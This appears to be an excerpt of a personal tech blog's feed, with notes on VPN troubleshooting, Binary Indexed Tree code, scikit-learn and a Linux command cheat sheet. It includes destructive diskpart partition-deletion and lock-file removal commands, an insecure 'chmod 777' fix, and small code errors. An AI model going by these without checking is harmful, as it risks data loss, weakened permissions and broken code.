+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ping www.tumblr.com
+</span><span class='line'>
+</span><span class='line'>Pinging www.tumblr.com [66.6.42.30] with 32 bytes of data:
+</span><span class='line'>Reply from 117.103.177.121: Destination net unreachable.
+</span><span class='line'>
+</span><span class='line'>nslookup
+</span><span class='line'>
+</span><span class='line'>&gt; www.tumblr.com
+</span><span class='line'>Server:  google-public-dns-a.google.com
+</span><span class='line'>Address:  8.8.8.8
+</span><span class='line'>
+</span><span class='line'>Non-authoritative answer:
+</span><span class='line'>Name:    www.tumblr.com.dev.tsinghuax.org
+</span><span class='line'>Address:  101.6.244.5</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Just clear the <code>/etc/hosts</code> file.</p>
+
+<h3>MPPE required but peer negotiation failed</h3>
+
+<p>I had to enable Point-to-Point encryption(MPPE) in the Advanced Settings dialog.</p>
+
+<h3>tcpdump</h3>
+
+<p>ARP: Address Resolution Protocol.</p>
+
+<p>MAC address: Media Access Control address.</p>
+
+<p><code>lsb_release</code>: linux standard base.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tcpdump -ennqti eth0 \( arp or icmp \)</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>56:00:00:39:b7:93 &gt; fe:00:00:39:b7:93, IPv4, length 102: 45.32.251.88 &gt; 221.229.172.35: ICMP 45.32.251.88 tcp port 22 unreachable, length 68</span></code></pre></td></tr></table></div></figure>
+
+
+<p>ICMP: Internet Control Message Protocol.</p>
+
+<p>Just correct the script for <code>l2tpd</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>NET_IFO=${VPN_IFACE:-'ens3'}
+</span><span class='line'>NET_IFS=$(VPN_IFACE:-'ens3')</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Binary Indexed Tree]]></title>
+    <link href="http://songzy12.github.io/blog/2017/10/21/binary-indexed-tree/"/>
+    <updated>2017-10-21T10:14:50+08:00</updated>
+    <id>http://songzy12.github.io/blog/2017/10/21/binary-indexed-tree</id>
+    <content type="html"><![CDATA[<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>int lowbit(int x) {
+</span><span class='line'>    return x & (-x);
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>One Dimension</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>int sum(int x) {
+</span><span class='line'>    int ret = 0;
+</span><span class='line'>    while(x &gt; 0) {
+</span><span class='line'>        ret += BIT[x]);
+</span><span class='line'>        x -= lowbit(x);
+</span><span class='line'>    }
+</span><span class='line'>    return ret;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>void add(x, val) {
+</span><span class='line'>    while(x &lt;= N) {
+</span><span class='line'>        BIT[x] += val;
+</span><span class='line'>        x += lowbit(x);
+</span><span class='line'>    }
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Two Dimension</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>void add(int x, int y, int val) {
+</span><span class='line'>    for(int i = x; i &lt;= N; i += lowbit(i)) {
+</span><span class='line'>        for(int j = y; j &lt;= N; j += lowbit(j)) {
+</span><span class='line'>            BIT2[i][j] += val;
+</span><span class='line'>        }
+</span><span class='line'>    }
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>int sum(int x, int y) {
+</span><span class='line'>    int ret = 0;
+</span><span class='line'>    for(int i = x; i &gt; 0; i -= lowbit(i)) {
+</span><span class='line'>        for(int j = y; j &gt; 0; j -= lowbit(j)) {
+</span><span class='line'>            ret += BIT2[i][j];
+</span><span class='line'>        }
+</span><span class='line'>    }
+</span><span class='line'>    return ret;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Jupyter Notebook]]></title>
+    <link href="http://songzy12.github.io/blog/2017/09/26/jupyter-notebook/"/>
+    <updated>2017-09-26T14:24:33+08:00</updated>
+    <id>http://songzy12.github.io/blog/2017/09/26/jupyter-notebook</id>
+    <content type="html"><![CDATA[<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>jupyter notebook</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Matplotlib</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>%matplotlib inline</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>import matplotlib.pyplot as plt
+</span><span class='line'>import numpy as np
+</span><span class='line'>
+</span><span class='line'>x = np.arange(20)
+</span><span class='line'>y = x**2
+</span><span class='line'>
+</span><span class='line'>plt.plot(x, y)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then hit <code>Shift</code>+<code>Enter</code></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Suffix Array]]></title>
+    <link href="http://songzy12.github.io/blog/2017/08/20/suffix-array/"/>
+    <updated>2017-08-20T20:00:52+08:00</updated>
+    <id>http://songzy12.github.io/blog/2017/08/20/suffix-array</id>
+    <content type="html"><![CDATA[
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Sklearn]]></title>
+    <link href="http://songzy12.github.io/blog/2017/06/23/sklearn/"/>
+    <updated>2017-06-23T17:17:44+08:00</updated>
+    <id>http://songzy12.github.io/blog/2017/06/23/sklearn</id>
+    <content type="html"><![CDATA[<h2>feature_extraction</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>from sklearn.feature_extraction.text import CountVectorizer
+</span><span class='line'>vectorizer = CountVectorizer()
+</span><span class='line'>corpus = [
+</span><span class='line'>        'This is the first document.',
+</span><span class='line'>        'This is the second second document.',
+</span><span class='line'>        'And the third one.',
+</span><span class='line'>        'Is this the first document?',
+</span><span class='line'>    ]
+</span><span class='line'>X = vectorizer.fit_transform(corpus)
+</span><span class='line'>X.toarray()
+</span><span class='line'>vectorizer.get_feature_names()
+</span><span class='line'>vectorizer.vocabulary_</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>from sklearn.feature_extraction.text import TfidfTransformer
+</span><span class='line'>transformer = TfidfTransformer()
+</span><span class='line'>counts = [[3, 0, 1],
+</span><span class='line'>           [2, 0, 0],
+</span><span class='line'>           [3, 0, 0],
+</span><span class='line'>           [4, 0, 0],
+</span><span class='line'>           [3, 2, 0],
+</span><span class='line'>           [3, 0, 2]]
+</span><span class='line'>tfidf = transformer.fit_transform(counts)
+</span><span class='line'>tfidf.toarray()</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>linear_model</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&gt;&gt;&gt; import numpy as np
+</span><span class='line'>&gt;&gt;&gt; from sklearn import linear_model
+</span><span class='line'>&gt;&gt;&gt; X = np.array([[-1, -1], [-2, -1], [1, 1], [2, 1]])
+</span><span class='line'>&gt;&gt;&gt; Y = np.array([1, 1, 2, 2])
+</span><span class='line'>&gt;&gt;&gt; clf = linear_model.SGDClassifier()
+</span><span class='line'>&gt;&gt;&gt; clf.fit(X, Y)
+</span><span class='line'>print(clf.predict([[-0.8, -1]]))</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>cluster</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>from sklearn.cluster import KMeans
+</span><span class='line'>kmeans = KMeans(n_clusters=n_digits, n_init=10)
+</span><span class='line'>kmeans.fit(reduced_data)
+</span><span class='line'>centroids = kmeans.cluster_centers_
+</span><span class='line'>labels = kmeans.labels_
+</span><span class='line'>inertia_ = kmeans.inertia_</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>decomposition</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>import numpy as np
+</span><span class='line'>from sklearn.decomposition import PCA
+</span><span class='line'>X = np.array([[-1, -1], [-2, -1], [-3, -2], [1, 1], [2, 1], [3, 2]])
+</span><span class='line'>pca = PCA(n_components=2)
+</span><span class='line'>pca.fit(X)
+</span><span class='line'>print(pca.explained_variance_ratio_) </span></code></pre></td></tr></table></div></figure>
+
+
+<h2>ensemble</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>from sklearn.ensemble import RandomForestClassifier
+</span><span class='line'>
+</span><span class='line'>dataset = genfromtxt(open('data/train.csv','r'), delimiter=',', dtype='f8')[1:]
+</span><span class='line'>target = [x[0] for x in dataset]
+</span><span class='line'>train = [x[1:] for x in dataset]
+</span><span class='line'>test = genfromtxt(open('data/test.csv','r'), delimiter=',', dtype='f8')[1:]
+</span><span class='line'>
+</span><span class='line'>rf = RandomForestClassifier(n_estimators=100)
+</span><span class='line'>rf.fit(train, target)
+</span><span class='line'>
+</span><span class='line'>predicted_digits = rf.predict(test)</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Linux]]></title>
+    <link href="http://songzy12.github.io/blog/2017/06/23/linux/"/>
+    <updated>2017-06-23T14:38:26+08:00</updated>
+    <id>http://songzy12.github.io/blog/2017/06/23/linux</id>
+    <content type="html"><![CDATA[<h2>locale</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>vi ~/.bashrc</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>export LC_ALL="en_US.UTF-8"
+</span><span class='line'>export LANG="en_US.UTF-8"</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>EFI</h2>
+
+<p><a href="http://linuxbsdos.com/2015/09/05/how-to-delete-grub-files-from-a-boot-efi-partition-in-windows-10/">http://linuxbsdos.com/2015/09/05/how-to-delete-grub-files-from-a-boot-efi-partition-in-windows-10/</a></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>% These commands are used to identify and select the hard drive
+</span><span class='line'>
+</span><span class='line'>diskpart
+</span><span class='line'> 
+</span><span class='line'>list disk
+</span><span class='line'> 
+</span><span class='line'>sel disk 
+</span><span class='line'> 
+</span><span class='line'>% These commands are used to list the partitions, select the Boot EFI partition, 
+</span><span class='line'>% then assign it a drive letter
+</span><span class='line'> 
+</span><span class='line'>list vol
+</span><span class='line'> 
+</span><span class='line'>sel vol 2
+</span><span class='line'> 
+</span><span class='line'>assign letter=D:
+</span><span class='line'> 
+</span><span class='line'>exit
+</span><span class='line'> 
+</span><span class='line'>% These commands are used to change into the Boot EFI folder and delete the GRUB folder
+</span><span class='line'> 
+</span><span class='line'>cd /d D:
+</span><span class='line'> 
+</span><span class='line'>ls
+</span><span class='line'> 
+</span><span class='line'>ls EFI
+</span><span class='line'> 
+</span><span class='line'>cd EFI
+</span><span class='line'> 
+</span><span class='line'>ls
+</span><span class='line'> 
+</span><span class='line'>rmdir /s ubuntu</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>diskpart
+</span><span class='line'>select disk 0
+</span><span class='line'>select partition 3
+</span><span class='line'>delete partition override
+</span><span class='line'>exit</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>apt</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>E: Could not get lock /var/lib/dpkg/lock - open (11: Resource temporarily unavailable)
+</span><span class='line'>E: Unable to lock the administration directory (/var/lib/dpkg/), is another process using it?
+</span><span class='line'>
+</span><span class='line'>sudo rm /var/cache/apt/archives/lock
+</span><span class='line'>sudo rm /var/lib/dpkg/lock</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Reading package lists... Error!
+</span><span class='line'>E: Encountered a section with no Package: header
+</span><span class='line'>E: Problem with MergeList /var/lib/apt/lists/cn.archive.ubuntu.com_ubuntu_dists_xenial-backports_main_binary-amd64_Packages
+</span><span class='line'>E: The package lists or status file could not be parsed or opened.
+</span><span class='line'>
+</span><span class='line'>sudo rm -vf /var/lib/apt/lists/*
+</span><span class='line'>sudo apt-get update</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>upgrade</h3>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sudo apt-get update
+</span><span class='line'>sudo apt upgrade</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>2 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
+</span><span class='line'>29 not fully installed or removed.</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>autoclean, clean, autoremove</h3>
+
+<ul>
+<li><code>clean</code>: clean clears out the local repository of retrieved package files. It removes everything but the lock file from <code>/var/cache/apt/archives/</code> and <code>/var/cache/apt/archives/partial/</code>. When APT is used as a dselect(1) method, clean is run automatically. Those who do not use dselect will likely want to run apt-get clean from time to time to free up disk space.</li>
+<li><code>autoclean</code>: Like clean, autoclean clears out the local repository of retrieved package files. The difference is that it only removes package files that can no longer be downloaded, and are largely useless. This allows a cache to be maintained over a long period without it growing out of control. The configuration option <code>APT::Clean-Installed</code> will prevent installed packages from being erased if it is set to off.</li>
+<li><code>autoremove</code>: is used to remove packages that were automatically installed to satisfy dependencies for some package and that are no more needed.</li>
+</ul>
+
+
+<h2>awk</h2>
+
+<ul>
+<li>-F: &ndash;filed-separator</li>
+</ul>
+
+
+<h2>bg</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Ctrl-z
+</span><span class='line'>fg</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>chmod</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>rm: cannot remove ‘date.csv’: Permission denied
+</span><span class='line'>
+</span><span class='line'>chmod 777 .</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>curl</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>curl -L https://raw.githubusercontent.com/edx/configuration/master/vagrant/release/devstack/Vagrantfile &gt; Vagrantfile
+</span><span class='line'>curl -o vagrant_1.7.2_x86_64.deb https://releases.hashicorp.com/vagrant/1.8.1/vagrant_1.8.1_x86_64.deb</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>-L, &ndash;location: (HTTP/HTTPS) If the server reports that the requested page has moved to a different location (indicated with a Location: header and a 3XX response code), this option will make curl redo the request on the new place.</li>
+<li>-o, &ndash;output <file>: Write output to <file> instead of stdout.</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>curl http://{site,host}.host[1-5].com -o "#1_#2" </span></code></pre></td></tr></table></div></figure>
+
+
+<h2>dirname</h2>
+
+<p>Get the name of the directory where a script is executed:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>echo $(dirname $SHELL)
+</span><span class='line'>echo $(dirname `readlink -f -- $0`)</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>dpkg</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>29 not fully installed or removed.</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sudo apt install -f</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Searches for packages that have been installed only partially on your system. dpkg will suggest what to do with them to get them working.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sudo dpkg -C </span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>The following packages have been unpacked but not yet configured.</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sudo dpkg --configure -a</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>dpkg-query: package 'ibus-table' is not installed</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sudo apt install ibus-table</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>du</h2>
+
+<p>disk usage.</p>
+
+<ul>
+<li>-s: &ndash;summarize</li>
+<li>-h: &ndash;human-readable</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>du -sh *</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>file</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>file CATS20LINUX </span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>-bash: ./CATS20LINUX: No such file or directory </span></code></pre></td></tr></table></div></figure>
+
+
+<p>You&rsquo;re probably trying to run a 32-bit binary on a 64-bit system that doesn&rsquo;t have 32-bit support installed.</p>
+
+<h2>find</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>find . -name 'jquery.min.js'
+</span><span class='line'>find . -name '*.md'</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>gcc</h2>
+
+<p><a href="http://translationproject.org/domain/gcc.html">translationproject</a>.</p>
+
+<p><a href="http://docs.embarcadero.com/products/rad_studio/radstudio2007/RS2007_helpupdates/HUpdate4/EN/html/devwin32/cppcompmessagespart_xml.html">error message</a>.</p>
+
+<h2>gnome-open</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gnome-open main.pdf</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>grep</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>find -iname "*.py" | xargs grep -i mooc2</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>grep -r 'pending' .</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>-v: &ndash;invert-match</li>
+<li>-i: &ndash;ignore-case</li>
+<li>-f: FILE</li>
+<li>-c: &ndash;count</li>
+<li>-n: &ndash;line-number</li>
+</ul>
+
+
+<h2>hosts</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sudo: unable to resolve host (none)</span></code></pre></td></tr></table></div></figure>
+
+
+<ul>
+<li>That the <code>/etc/hostname</code> file contains just the name of the machine.</li>
+<li>That <code>/etc/hosts</code> has an entry for localhost. It should have something like:</li>
+</ul>
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>127.0.0.1    localhost.localdomain localhost
+</span><span class='line'>127.0.1.1    my-machine</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>ip</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>curl http://ifconfig.me/ip
+</span><span class='line'>wget -O- -q http://ifconfig.me/ip</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>jar</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>jar tf libsvm-3.17-sources.jar
+</span><span class='line'>jar xf libsvm-3.17-sources.jar svm_scale.java</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>javac</h2>
+
+<p>If anyone else has ever wondered about this I eventually tore open the <code>tools.jar</code> file located in <code>jdk(version_here)/lib</code>. From there your going to <code>sun/tools/javac/javac.properties</code> if you want to actually read the messages.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cd /usr/lib/jvm/java-8-openjdk-amd64/lib
+</span><span class='line'>jar xf tools.jar sun/tools/javac/resources/javac.properties</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>kill</h2>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sudo netstat -antlp
+</span><span class='line'>kill -s 9 20383</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>jobs
